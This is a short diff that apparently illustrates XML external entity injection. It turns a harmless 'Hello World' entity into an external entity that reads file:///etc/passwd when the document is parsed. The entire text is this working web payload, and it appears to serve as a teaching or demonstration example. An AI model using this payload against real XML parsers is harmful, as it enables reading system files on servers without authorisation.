@@ -1,7 +1,8 @@
 <!DOCTYPE foo [
   <!ELEMENT foo ANY>
-  <!ENTITY bar "World">
+  <!ENTITY bar SYSTEM
+  "file:///etc/passwd">;
 ]>
 <foo>
-  Hello &bar;
+  &bar;
 </foo>
